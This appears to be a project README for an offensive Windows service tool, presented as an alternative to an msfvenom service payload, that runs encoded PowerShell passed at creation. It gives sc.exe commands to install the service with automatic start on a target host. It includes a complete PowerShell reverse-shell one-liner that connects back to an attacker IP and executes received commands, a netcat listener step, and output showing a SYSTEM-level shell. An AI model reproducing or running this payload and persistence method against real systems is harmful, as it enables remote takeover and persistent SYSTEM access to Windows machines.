# Power Shell Service

A very basic Windows service that will run the encoded powershell provided as an argument to the service during creation.

I created this to simply have an alternative to `msfvenom` payload `exe-service` and to have the ability to have a dynamic powershell payload.

## Build

Simply clone and build the project on Windows. Release binaries were built with Visual Studio 2022.

## Usage

```powershell
sc.exe create PSService binPath= "C:\Users\public\PSService.exe <encoded_powershell>" start= auto

sc.exe start PSService
```

Replace `<encoded_powershell>` with your encoded powershell.

### Reverse Shell Example

1. Encode your Powershell script

```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.146",4447);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# 
```

2. Start `nc` listener on attacker machine

```
$ rlwarp nc -lnvp 4447
```

3. Transfer binaries to target host and create and start service

```powershell
sc.exe create PSService binPath= "C:\Users\public\PSService.exe " start= auto

sc.exe start PSService
```

4. Catch reverse shell on attacker machine

```
~/sec ❯ rlwrap nc -lnvp 4447
Listening on 0.0.0.0 4447
Connection received on 192.168.1.146 53331

PS C:\WINDOWS\system32> whoami
nt authority\system
```
